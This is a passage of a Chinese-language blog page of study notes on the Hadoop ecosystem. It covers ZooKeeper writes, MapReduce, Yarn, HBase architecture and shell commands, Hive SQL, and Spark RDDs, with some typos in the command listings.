href="#ZooKeeper的写特性" class="headerlink" title="ZooKeeper的写特性"></a>ZooKeeper的写特性</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151414157.png?token=ARYCSAXYXQNR64JHII24XQDCQCNII"></p><ol><li>Client发起写入请求 如果请求到的节点不是leader节点，follower会把请求转发给leader</li><li>leader接收到请求后会向所有节点发出询问是否可以接收写入</li><li>节点接收到询问请求,根据自身情况反馈是否可写入的信息给leader</li><li>leader接收到一半以上的节点可以写入，再执行写入</li><li>写入完成后反馈给client,如果Client请求的不是leader, leader把写 入状态反馈给follower,由follower反馈给client</li></ol><h1 id="MapReduce"><a href="#MapReduce" class="headerlink" title="MapReduce"></a>MapReduce</h1><pre><code>数据处理(数据计算)创建者:道格卡廷出发点:搜索引擎--&gt;处理问题google: mapreduce论文MapReduce的特性:分布式计算</code></pre><h2 id="MapReduce的特性-分布式计算"><a href="#MapReduce的特性-分布式计算" class="headerlink" title="MapReduce的特性:分布式计算"></a>MapReduce的特性:分布式计算</h2><ul><li>高度抽象的编程思想:编程人员只需要描述做什么，具体怎么做交由处理框架执行的</li><li>可扩展性:分布式、搭建在集群上的一-个处理组件</li><li>高容错性:处理任务时节点故障，迁移到其他节点执行任务MapReduce任务主要分为两大部分: map任务、 reduce任务</li></ul><h2 id="MapReduce任务"><a href="#MapReduce任务" class="headerlink" title="MapReduce任务"></a>MapReduce任务</h2><ul><li>reduce任务的处理数据来源是map任务的输出</li><li>map阶段:针对每个数据执行一个操作, 提取数据特征</li><li>reduce阶段:获取到多个map的输出，统一计 算处理,针对key统计汇总这个key对应的value</li></ul><h2 id="Map阶段详情"><a href="#Map阶段详情" class="headerlink" title="Map阶段详情"></a>Map阶段详情</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151414971.png?token=ARYCSATLAWLW5KMTUFKFGMLCQCNJA"></p><ol><li>数据从数据源获取后进行分片切分、执行map操作</li><li>分片会被存储在环形内存缓冲区( 当缓冲区达到80%会发生溢写)</li><li>把分片溢写到磁盘中，生成MOF文件</li><li>溢写过程中对数据执行</li></ol><h2 id="Map阶段详情-1"><a href="#Map阶段详情-1" class="headerlink" title="Map阶段详情"></a>Map阶段详情</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151414178.png?token=ARYCSAQANK6MV3W4IXLU2I3CQCNJY"></p><ol><li>把数据(MOF)从磁盘中加载到内存中</li><li>当数据量过大会执行归并，如果不多，直接跳过归并执行归约操作</li><li>执行完reduce操作之后，最终结果写入到HDFS</li></ol><h2 id="词频统计案例-单词计数WordCount"><a href="#词频统计案例-单词计数WordCount" class="headerlink" title="词频统计案例(单词计数WordCount)"></a>词频统计案例(单词计数WordCount)</h2><ol><li>数据源(很多英文句子或短语的一个文件)</li><li>提取出每个单词,统计单词出现的次数<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151415672.png?token=ARYCSAXFO4SAXDL2SDP6U2DCQCNMS"></li></ol><h2 id="MapReduce缺点"><a href="#MapReduce缺点" class="headerlink" title="MapReduce缺点"></a>MapReduce缺点</h2><ul><li>处理延迟性高</li><li>使用java语言编程map处理reduce处理</li><li>MapReduce处理任务需要使用资源</li></ul><h2 id="MapReduce-V1资源调度出现的问题"><a href="#MapReduce-V1资源调度出现的问题" class="headerlink" title="MapReduce V1资源调度出现的问题"></a>MapReduce V1资源调度出现的问题</h2><ul><li>如果发生问题，通知用户介入解决</li><li>没有区分任务调度和资源调度，都是MR的主节点在处理，主节点的整体工作压力非常大</li><li>因为资源没有单独隔离,容易出现资源抢占的问题</li></ul><h1 id="Yarn"><a href="#Yarn" class="headerlink" title="Yarn"></a>Yarn</h1><pre><code>资源调度管理服务---&gt; 可以协助其他组件应用协调管理资源，以及任务调度</code></pre><h2 id="Yarn的系统架构"><a href="#Yarn的系统架构" class="headerlink" title="Yarn的系统架构"></a>Yarn的系统架构</h2><pre><code>在集群层面来说只有一个ResourceManager, 多个NodeManager以程序执行层面来说，一个应用只有一-个AppMaster,多个Container</code></pre><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151415737.png?token=ARYCSARBIQVH4N564AKKJMLCQCNNI"></p><ul><li>Client:客户端</li><li>ResourceManager (主节点) :负责资源管理,任务调度</li><li>NodeManager (从节点) :负责提供资源，实际任务执行</li><li>ApplicationMaster:特殊的Container, 管理同一应用的其他Container,以及实时关注任务执行状态,反馈给RM</li><li>Container:<code>资源的抽象</code>，被封装起来的资源，一个Container执行一个任务, 其他任务不能使用这个Container的资源</li></ul><h2 id="MapReduce-On-Yarn任务处理流程"><a href="#MapReduce-On-Yarn任务处理流程" class="headerlink" title="MapReduce On Yarn任务处理流程"></a><code>MapReduce On Yarn任务处理流程</code></h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151416739.png?token=ARYCSARS5WJ7BORNAHKFOJLCQCNN4"></p><ol><li>Client向RM发起请求</li><li>RM(ApplicationManager)接收到请求后在NM中启动一-个AppMaster</li><li>AppMaster接收任务，根据任务向RM (ResourceScheduler) 申请资源</li><li>在NM中封装资源Container提供给AppMaster执行应用</li><li>执行过程中Container会实时反馈执行状态给AppMaster</li><li>AppMaster会反馈任务执行状态和自身状态给RM (ApplicationManager)</li><li>AppMaster将运行结果反馈给RM,然后向RM (ResourceScheduler) 申请释放资源</li><li>RM将任务情况反馈给Client</li></ol><p>Yarn搭建时支持主备配置，实现主备ResourceManager<br>AppMaster的容错(当-个AppMaster出现故障,任务管理会被迁移到新的AppMaster)</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151416345.png?token=ARYCSAT3PEMWREPF6Y6UIPLCQCNO4"></p><h1 id="HBase"><a href="#HBase" class="headerlink" title="HBase"></a>HBase</h1><pre><code>HBase分布式列式NoSQL数据库，底层存储使用的是HDFS ,`没有数据类型，所有数据存储都是字节数组的形式byte[]`创建者:道格卡廷出发点:搜索引擎--&gt;提高数据读写速度--&gt; BigTable</code></pre><h2 id="HBase的特性"><a href="#HBase的特性" class="headerlink" title="HBase的特性"></a>HBase的特性</h2><ul><li>可扩展性:可以通过添加节点的方式增加数据存储空间</li><li>高可靠性:底层使用HDFS,能够保证数据的可靠性，预写式日志保证内存中的数据不丢失</li><li>高性能:处理PB级别的数据</li><li>面向列: HBase数据存储是面向列的</li><li>可伸缩性:动态添加列(在添加数据的时候)-</li></ul><h2 id="面向列、面向行数据库的优缺点"><a href="#面向列、面向行数据库的优缺点" class="headerlink" title="面向列、面向行数据库的优缺点"></a>面向列、面向行数据库的优缺点</h2><ul><li>面向行:<br>  优点:能方便快捷的获取一一行记录<br>  缺点:在想要单独获取指定列数据的时候，会检索到其他无关列</li><li>面向列:<br>  优点:在检索单列数据时，不会出现无关列<br>  缺点:想要查询一条记录时，需要多次IO请求才能拼出一条记录</li></ul><h2 id="HBase和RDB-关系型数据库-的区别比较"><a href="#HBase和RDB-关系型数据库-的区别比较" class="headerlink" title="HBase和RDB (关系型数据库)的区别比较"></a>HBase和RDB (关系型数据库)的区别比较</h2><ul><li>数据索引: <br>HBase只有一 种索引(rowkey)，RDB中可以配置多个索引</li><li>数据维护: <br>HBase允许数据增删查,<code>不支持修改</code>，RDB中允许数据增删查改<br>HBase可以使用覆盖的方式写入数据以此实现数据修改的功能<br>可伸缩性: HBase可以在添加数据时动态添加列，RDB只能通过修改表的方式添加列<br>RDB (MySQL) 数据模型:数据库、表、行、列(字段)，单元格</li></ul><h2 id="HBase数据模型"><a href="#HBase数据模型" class="headerlink" title="HBase数据模型"></a>HBase数据模型</h2><pre><code>命名空间、表、行、列(组成列族)、单元格(可以存储多条记录)</code></pre><ul><li>命名空间: hbase、 default. 自定义(在使用自定义的命名空间时都需要指定命名空间名称)</li><li>表:由行和列组成</li><li>行:有一个唯一表示行键(rowkey)</li><li>列:归属于某一个列族(<code>动态添加</code>)</li><li>列族:由一个或多个列组成(创建表时创建的，不能动态更改)</li><li>单元格:由行和列能确定-一个单元格，<code>一个单元格中可能存在多条记录(多版本记录，使用时间戳进行区分)</code></li></ul><h2 id="HBase的表结构"><a href="#HBase的表结构" class="headerlink" title="HBase的表结构"></a>HBase的表结构</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151416733.png?token=ARYCSAXZAIA7GUOAB6GHIRDCQCNPY"></p><pre><code>要找到行列对应的单元格值时，表行键,列族:列默认情况下，只返回单元格中的最新记录，如果要返回多版本需要指定参数VERSIONS=&gt;3</code></pre><h2 id="HBase系统架构"><a href="#HBase系统架构" class="headerlink" title="HBase系统架构"></a>HBase系统架构</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151416644.png?token=ARYCSASVT7UT7XUFLMIYFLLCQCNRC"></p><ul><li>Client:用户可以通过Client连接到HBase,基本不与HMaster交互</li><li>ZooKeeper:监测HMaster的主备运行状态及主备切换，监测HRegionServer的状态，反馈给HMaster,<code>存储HBase元数据信息hbase:meta</code></li><li>Hmaster() ：管理维护HRegionServer列表，管理分配Region, Region负载均衡</li><li>HRegionServer：管理分配给它的Region，处理用户的读写请求</li><li>DFS Client: HBase连接到HDFS的接口</li></ul><p>一个HRegionserver中包含一个HLog， 多个HRegion</p><ul><li><p>HLog:预写式日志WAL,记录数据操作(数据写入之前必须先写入HLog)</p></li><li><p>Region:<code>分布式存储的最基本单位，刚开始一个Region存储一个表的内容随着数据增多</code>，Region会不断分裂<br>Store:一个Region中包含多个Store,<code>一个Store存储一个列族数据</code><br>MemStore (写缓存):一个Store包含一个MemStore <br>StoreFile (磁盘文件):一个Store中包含多个StoreFile<br>HFile (HDFS文件): 一个StoreFile添加头部信息转换成HFile,最终存储在HDFS中</p></li><li><p>数据写入关键流程:先写入HLog,然后才能写入MemStore,当MemStore达到溢出要求(128M) ,将数据刷写StoreFile中</p></li><li><p>数据读取关键流程:先读取MemStore,如果没有,再读取BlockCache (读缓存)，如果还是没有最终才读取StoreFile<br>BlockCache存储之前的用户查询过的数据，当MemStore和BlockCache中都没有数据， 需要从StoreFile<br>中读取数据时，读取完的数据会被加载到BlockCache中</p></li></ul><h2 id="Region拆分"><a href="#Region拆分" class="headerlink" title="Region拆分"></a>Region拆分</h2><ul><li>拆分原因:数据不断增加，region不断增大， region过大会影响数据读写速度</li><li>拆分条件:根据行键拆分，尽可能将同一个行键或相似的行键放在一个Region中</li></ul><p>-region拆分过程很快，接近瞬间,在拆分时实际还是请求的原文件,拆分结束之后会将原文件内容异步写入新文件,然后之后的请求被转移到新文件</p><h2 id="Region定位"><a href="#Region定位" class="headerlink" title="Region定位"></a>Region定位</h2><p>  元数据信息存储在hbase:meta中,这个表信息被存储在zookeeper内存中通过元数据信息获取Region实际存储位置</p><h2 id="HRegionServerBR"><a href="#HRegionServerBR" class="headerlink" title="HRegionServerBR"></a>HRegionServerBR</h2><p>H RegionServer出现故障时</p><ol><li>zookeeper发现RegionServer故障，同时HMaster</li><li>HMaster获取故障的RegionServer上的HLog信息，根据与Region的对应关系对HLog进行拆分</li><li>把HLog存放在Region目录下，把Region重新迁移至其他的RegionServer上</li><li>其他的RegionServer接收到Region执行重新执行HLog内容</li></ol><h2 id="HLog的工作原理"><a href="#HLog的工作原理" class="headerlink" title="HLog的工作原理"></a>HLog的工作原理</h2><ul><li>HLog: WAL预写式日志，数据更新的操作都要先写入HLog中，才能写入MemStore<br><code>当MemStore被刷写到磁盘后，会向HLog中写入一条标记记录 (标记记录之前的所有数据都已经刷写到磁盘)</code></li><li>系统启动时，系统任务先扫描HLog, 检测是否有数据没有写入到磁盘中,如果有先执行写入MemStore,然后再刷写到磁盘，清空缓存,最后再为用户提供服务 <br>如果数据丢失，可以根据HLog重新执行恢复</li><li>一个RegionServer只有一-个HLog (共用一个HLog)<br>  优点:写入日志时不需要查找对应的Log,直接全部写入一个HLog<br>  缺点:如果RegionServer出现故障， 需要对HLog进行拆分</li></ul><h2 id="缓存刷写-把MemStore数据写入到StoreFile中"><a href="#缓存刷写-把MemStore数据写入到StoreFile中" class="headerlink" title="缓存刷写(把MemStore数据写入到StoreFile中)"></a>缓存刷写(把MemStore数据写入到StoreFile中)</h2><ul><li>当MemStore达到刷写条件，就会将内容刷写到StoreFile文件中</li><li>缓存的刷写是针对整个Region的，当一个MemStore达到刷写要求， 当前的Region下面的所有MemStore都会触发刷写</li><li>每次刷写都会生成一个新的StoreFile文件(每次的刷写内容都分别在一个新文件中)</li><li>刷写完成之后会在HLog中写入标记记录,并且清空缓存</li></ul><h2 id="StoreFile的合并"><a href="#StoreFile的合并" class="headerlink" title="StoreFile的合并"></a>StoreFile的合并</h2><pre><code>(刷写操作会出现大量的StoreFile,且部分StoreFile文件大小过小) 合并比较消耗资源,达到一定阈值才会执行将多个的StoreFile小文件合并成一个大文件,如果StoreFile文件过大，再进行拆分(根据HDFS块进行拆分)</code></pre><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151417167.png?token=ARYCSARKZXKFELTQTTNKS2LCQCNSG"></p><p>合并文件会进行筛选:如果本身的StoreFile就已经达到1 00M左右,这个StoreFile是不参与合并的</p><h2 id="HBase读取流程"><a href="#HBase读取流程" class="headerlink" title="HBase读取流程"></a>HBase读取流程</h2><ol><li>Client请求zookeeper获取hbase:meta表元数据信息，获取RegionServer信息</li><li>Client请求相对应的RegionServer</li><li>RegionServer接收到请求反馈数据给Client</li><li>关闭读取流</li></ol><h2 id="HBase写入流程"><a href="#HBase写入流程" class="headerlink" title="HBase写入流程"></a>HBase写入流程</h2><ol><li>Client请求的zookeeper,获取hbase:meta表信息,根据写入的行键获取对应的RegionServer信息</li><li>Client请求RegionServer发起写入请求</li><li>RegionServer接收到请求后将数据写入到行键对应的Region中.</li><li>RegionServer反馈写入状态给Client</li><li>关闭写入流</li></ol><h2 id="BloomFilter-布隆过滤器"><a href="#BloomFilter-布隆过滤器" class="headerlink" title="BloomFilter (布隆过滤器)"></a>BloomFilter (布隆过滤器)</h2><pre><code>判断数据是否存在，如果反馈结果为不存在，是可信的，如果反馈结果为存在，可能有误差</code></pre><p>缩小数据违取范围<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151417006.png?token=ARYCSAWFZISPZYGSH4D2ZW3CQCNTA"></p><p>在HBase中行键是以字典序进行排序<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151417994.png?token=ARYCSASMGZRH33VA4OG27TLCQCNTW"></p><h2 id="HBase-Shell命令"><a href="#HBase-Shell命令" class="headerlink" title="HBase Shell命令"></a>HBase Shell命令</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">namespace:</span><br><span class="line">    create_namespace <span class="string">&#x27;名称&#x27;</span></span><br><span class="line">    list_namespace</span><br><span class="line">    list_namespace_ tables <span class="string">&#x27;ns1&#x27;</span></span><br><span class="line">    alter_namespace <span class="string">&#x27;ns1 ,&#123;属性名称=&gt; &#x27;</span>属性值&#125;</span><br><span class="line">    drop_ namespace <span class="string">&#x27;ns1&#x27;</span> <span class="comment">---命名空间需要是空的</span></span><br><span class="line"></span><br><span class="line">ddl:数据定义语言<span class="comment">---&gt; 表层面的操作</span></span><br><span class="line">    <span class="keyword">create</span> <span class="string">&#x27;表名&#x27;</span>,列族名<span class="number">1</span><span class="string">&#x27;;列族2&#x27;</span></span><br><span class="line">    <span class="keyword">create</span> <span class="string">&#x27;表名,&#123;NAME= &gt; &#x27;</span>列族<span class="string">&#x27; VERSIONS= &gt; 5&#125;,&#123;NAME= &gt;列族&#x27;</span> ,VERSIONS<span class="operator">=</span> <span class="operator">&gt;</span><span class="number">5</span>&#125;</span><br><span class="line">    修改列族属性信息、添加列族: <span class="keyword">alter</span> <span class="string">&#x27;表名&#x27;</span>,&#123;NAME<span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;列族&#x27;</span> ,VERSIONS<span class="operator">=</span><span class="operator">&gt;</span><span class="number">5</span>&#125;<span class="comment">--&gt;如果列族存在做修改，不存在做添加</span></span><br><span class="line">    使用list可以查看所有的表:包含<span class="keyword">default</span>命名空间和自定义命名空间中的表</span><br><span class="line">    查看表信息: <span class="keyword">describe</span> <span class="string">&#x27;表名&#x27;</span></span><br><span class="line">    删除表: <span class="keyword">drop</span> <span class="string">&#x27;表名’--&gt; 禁用状态的表才 能进行删除</span></span><br><span class="line"><span class="string">    禁用表: disable 表名&#x27;</span> <span class="operator">/</span>启用表: enable <span class="string">&#x27;表名&#x27;</span></span><br><span class="line">    </span><br><span class="line">dml:数据管理语言<span class="comment">--&gt; 针对数据层面的操作</span></span><br><span class="line">    添加数据: put <span class="string">&#x27;表名，’行键&quot;,列族:列&quot;,值’--&gt; 默认使用的是系统时间戳</span></span><br><span class="line"><span class="string">    删除数据: delete &#x27;</span>表名&quot;;行键’</span><br><span class="line">    delete表名&#x27;,行键&quot;，列族:列<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    delete表名&#x27;</span>;行键&quot;,列族列,&#123;TIMESTEMP= &gt;&#x27;235652&#x27;&#125;</span><br><span class="line">    清空表: truncate &#x27;表名&#x27;</span><br><span class="line">    数据获取: get &#x27;表名&#x27;;行键’</span><br><span class="line">    get &#x27;表名&#x27;行键&quot;;列族列</span><br><span class="line">    <span class="keyword">get</span> <span class="string">&#x27;表名&#x27;</span>，<span class="string">&#x27;行键&quot;;列族列,&#123;VERSIONS=&gt;3&#125;</span></span><br><span class="line"><span class="string">    数据扫描: scan &#x27;</span>表名<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    scan &#x27;</span>表名&quot;&#x27;;行键&#x27;;列族列,VERSIONS= &gt;3&#125;</span><br><span class="line"></span><br><span class="line">snapshot:快照操作--&gt; 针对表创建快照，记录当前指定表的数据信息</span><br><span class="line">    创建快照: snapshot &#x27;表名&quot;，<span class="string">&#x27;快照名称&#x27;</span></span><br><span class="line">    还原快照: resotre_ snapshot <span class="string">&#x27;快照名&#x27;</span></span><br><span class="line">    克隆快照: clone_ snapshot ‘快照名;新表名<span class="string">&#x27; ---&gt;把快照中的表内容还原到一-张新表上</span></span><br><span class="line"><span class="string">    删除快照: delete snapshot &#x27;</span>快照名<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="Hive"><a href="#Hive" class="headerlink" title="Hive"></a>Hive</h1><pre><code>数据仓库，查询分析</code></pre><h2 id="Hadoop生态圈"><a href="#Hadoop生态圈" class="headerlink" title="Hadoop生态圈"></a>Hadoop生态圈</h2><ul><li>HDFS存储、 HBase存储提供实时读写功能</li><li>MapReduce并行计算、Yarn资源管理和任务调度</li><li>ZooKeeper协助分布式应用管理服务</li><li>Hive底层使用的是MapReduce做计算，MapReduce的使用对编程人员要求比较高</li><li>可以执行SQL类的查询分析计算</li></ul><h2 id="Hive数据模型"><a href="#Hive数据模型" class="headerlink" title="Hive数据模型"></a>Hive数据模型</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151417757.png?token=ARYCSAX53FFMS4HLAGAULR3CQCNU4"></p><ul><li><p>分区:根据字段值进行划分(指定分区字段,分区字段值相同的记录就存放在一一个分区中)<br>分区在物理上是一个文件夹<br>分区下还可以再有分区和桶<br>在创建表的时候可以指定分区字段<br>分区数量是不固定的</p></li><li><p>桶:根据值的哈希值进行求余放到对应的桶中<br>桶在物理.上是一-个文件<br>在创建表的时候可以指定有几个桶</p></li><li><p>表类型:托管表(内部表)、外部表、临时表<br>托管表(internal) :元数据和数据信息都是Hive在管理<br><code>删除时，元数据和数据都会被删除\</code><br>外部表(external) :元数据由Hive管理,但是数据可以提供给其他组件共享<br><code>删除时，只删除元数据，数据信息依旧保留\</code><br>临时表(temporary) :只在当前会话中生效，当会话结束表就会被自动删除</p></li></ul><h2 id="Hive数据仓库分层-逻辑分层"><a href="#Hive数据仓库分层-逻辑分层" class="headerlink" title="Hive数据仓库分层(逻辑分层)"></a>Hive数据仓库分层<code>(逻辑分层)</code></h2><ul><li>ODS (原数据层，操作数据层) :从数据源获取到的数据</li><li>DWD (数据明细层) :根据ODS做数据清洗得到的结果</li><li>DWS (数据服务层) :根据DWD进行汇总分析计算</li><li>ADS (应用服务层) :根据上层应用的业务需求将DWS数据再一次处理分析得到业务 需要的数据</li></ul><h2 id="Hive的分层处理的优势"><a href="#Hive的分层处理的优势" class="headerlink" title="Hive的分层处理的优势"></a>Hive的分层处理的优势</h2><ul><li>复杂问题简单化:将复杂问题分成多个流程，每个层面执行一-一个流程内容</li><li>减少重复开发:不要每次提供给上次应用数据时都要对数据进行清洗汇总操作</li><li>隔离原始数据:减少到原数据的依赖，避免因为原数据的原因，导致后续操作无法执行</li></ul><h2 id="Hive-SQL的使用"><a href="#Hive-SQL的使用" class="headerlink" title="Hive SQL的使用"></a>Hive SQL的使用</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">DDL:数据定义语言</span><br><span class="line">    创建表: <span class="keyword">create</span> <span class="keyword">table</span> <span class="string">&#x27;表名(字段类型,字段2类类型... .);</span></span><br><span class="line"><span class="string">    create external table表名&#x27;</span>(字段类型,字段<span class="number">2</span>类型....</span><br><span class="line">    <span class="keyword">create</span> temporary <span class="keyword">table</span> <span class="string">&#x27;表名&#x27;</span>(字段类型,字段<span class="number">2</span>类型... .</span><br><span class="line">    修改表: <span class="keyword">alter</span> <span class="keyword">table</span>表名<span class="string">&#x27; rename to &#x27;</span>新表名;</span><br><span class="line">    <span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">&#x27;表名&#x27;</span> addcolumns (字段类型);</span><br><span class="line">    删除表: <span class="keyword">drop</span> <span class="keyword">table</span> <span class="string">&#x27;表名&#x27;</span>;</span><br><span class="line">    查询数据库中的所有表: <span class="keyword">show</span> tables;</span><br><span class="line">    查看表信息: <span class="keyword">describe</span> <span class="keyword">table</span> <span class="string">&#x27;表名&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">DML:数据管理语言</span><br><span class="line">    添加数据:从文件中添加到表中</span><br><span class="line">    load data inpath HDFS路径<span class="keyword">into</span> <span class="keyword">table</span>表名</span><br><span class="line">    load data <span class="keyword">local</span> inpath Linux路径<span class="keyword">into</span> <span class="keyword">table</span>表名</span><br><span class="line">    load data <span class="keyword">local</span> inpath Linux路径overwrite <span class="keyword">into</span> <span class="keyword">table</span>表</span><br><span class="line">    </span><br><span class="line">    从一个表添加到另<span class="operator">-</span>一个表中</span><br><span class="line">    <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> 表名 <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 原表 <span class="keyword">where</span>条件;</span><br><span class="line">    <span class="keyword">from</span> 原表 <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> 表名 <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">where</span> 条件</span><br><span class="line">    <span class="keyword">from</span> 原表 <span class="keyword">insert</span> overwrite <span class="keyword">table</span> 表名 <span class="keyword">select</span> 字段 <span class="keyword">where</span> 条件</span><br><span class="line">    从表中导出到文件中</span><br><span class="line">    <span class="keyword">insert</span> <span class="keyword">into</span> directory HDFS路径 <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>表</span><br><span class="line">    <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">local</span> directory Linux 路径<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表</span><br><span class="line">    export <span class="keyword">table</span> 表 <span class="keyword">to</span> HDFS路径</span><br><span class="line">    </span><br><span class="line">DQL:数据查询语言</span><br><span class="line">    标准查询: <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>表名</span><br><span class="line">    分组: <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">group</span> <span class="keyword">by</span>字段</span><br><span class="line">    排序: <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">order</span> <span class="keyword">by</span>字段<span class="keyword">desc</span></span><br><span class="line">    多表联合查询: <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表 a <span class="keyword">join</span> 表b  <span class="keyword">on</span> a.id<span class="operator">=</span> b.id)</span><br><span class="line">    </span><br><span class="line">创建表时的特殊操作</span><br><span class="line">    分区: partitioned (字段类型)</span><br><span class="line">    指定列分隔符: <span class="type">row</span> format delimited fields terminated <span class="keyword">by</span> <span class="string">&#x27;分隔符&#x27;</span></span><br><span class="line">    指定外部表的存储路径: location 路径</span><br><span class="line">    指定外部表的存储类型: stored <span class="keyword">as</span> textfile</span><br><span class="line">    指定字段加密: <span class="type">ROW</span> FORMAT SERDE</span><br><span class="line">    <span class="string">&#x27;org.apache.hadoop.hive.serde2.lazy.LazySimpleSerDe&#x27;</span> <span class="keyword">WITH</span> SERDEPROPERTIES(</span><br><span class="line">    <span class="string">&#x27;column.encode.columns&#x27;</span><span class="operator">=</span><span class="string">&#x27;字段1,字段</span></span><br><span class="line"><span class="string">    2&#x27;</span>column.encode.classname<span class="string">&#x27; =&#x27;</span>org apache.hadoop.hive.serde2.AESRewriter);</span><br></pre></td></tr></table></figure><h1 id="Spark"><a href="#Spark" class="headerlink" title="Spark"></a>Spark</h1><h2 id="Spark特点"><a href="#Spark特点" class="headerlink" title="Spark特点"></a>Spark特点</h2><pre><code>轻快灵巧Spark的处理能力是MapReduce的30倍，处理能力不容易受到任务量增加的影响</code></pre><p>轻:底层代码只有3万行，使用的函数式编程语言scala<br>快:处理速度快<br>灵:提供很多不同层面的处理功能<br>巧:巧妙的应用Hadoop平台</p><h2 id="RDD-分布式数据集、可分区的"><a href="#RDD-分布式数据集、可分区的" class="headerlink" title="RDD:分布式数据集、可分区的"></a>RDD:分布式数据集、可分区的</h2><ul><li>具有血统机制(RDD由父RDD执行操作之后产生)</li><li>如果子RDD丢失，RDD故障，重新执行父RDD就可以重新得到的子RDD</li><li>RDD默认存储在内存中，如果内存不足的时候，发生溢写</li><li>Spark节点会分配60%的内存用于做缓存，40%执行内存</li></ul><h2 id="依赖类型"><a href="#依赖类型" class="headerlink" title="依赖类型"></a>依赖类型</h2><pre><code>宽依赖、窄依赖</code></pre><ul><li>窄依赖:父RDD的每个分区都只会被<code>一个</code>子RDD的分区所依赖</li><li>宽依赖:父RDD的每个分区可能会被<code>多个子RDD的分区所依赖</code></li></ul><h2 id="Stage划分"><a href="#Stage划分" class="headerlink" title="Stage划分"></a>Stage划分</h2><pre><code>遇到窄依赖就加入，宽依赖就断开，剩余的所有RDD被放在一个Stage中</code></pre><h2 id="RDD操作类型"><a href="#RDD操作类型" class="headerlink" title="RDD操作类型"></a>RDD操作类型</h2><ul><li><p>创建操作:创建RDD用于接收数据结果</p></li><li><p>原始RDD:读取数据源获得的RDD (readFile(path))</p></li><li><p>转换得来:通过父RDD执行操作后得到的子RDD</p></li><li><p>控制操作:持久化RDD,可以持久化到内存或磁盘中,默认存在内存</p></li><li><p>转换操作:可对RDD执行的处理操作，转换操作是懒惰的，转换操作并不是立马执行，遇到行动操作才执行</p></li><li><p>行动操作:实际调用Spark执行(存储文件,数据输出等)</p></li><li><p>transformation算子在整个程序中 -&gt;声明转换操作,实际并没有执行</p></li><li><p>action算子时， 会从第一-个操作开始执行</p></li><li><p>DataFrame:属于一个DataSet实例， 不可变的弹性分布式数据集，存储数据时不止存储数据内容,存储数据对应结构信息及类型</p></li><li><p>DataSet:以对象的形式存储数据集，DataFrame&#x3D; DataSet[Row]</p></li></ul><h2 id="RDD、DataFrame、-DataSet数据集的联系"><a href="#RDD、DataFrame、-DataSet数据集的联系" class="headerlink" title="RDD、DataFrame、 DataSet数据集的联系"></a>RDD、DataFrame、 DataSet数据集的联系</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151418011.png?token=ARYCSAWRARIHVOCZT6NHLH3CQCNVU"></p><h2 id="Spark体系架构"><a href="#Spark体系架构" class="headerlink" title="Spark体系架构"></a>Spark体系架构</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151418466.png?token=ARYCSAQGUHHKT3TZXELJC7LCQCNWU"></p><ul><li>集群部署形式: <br>Standalone: spark自 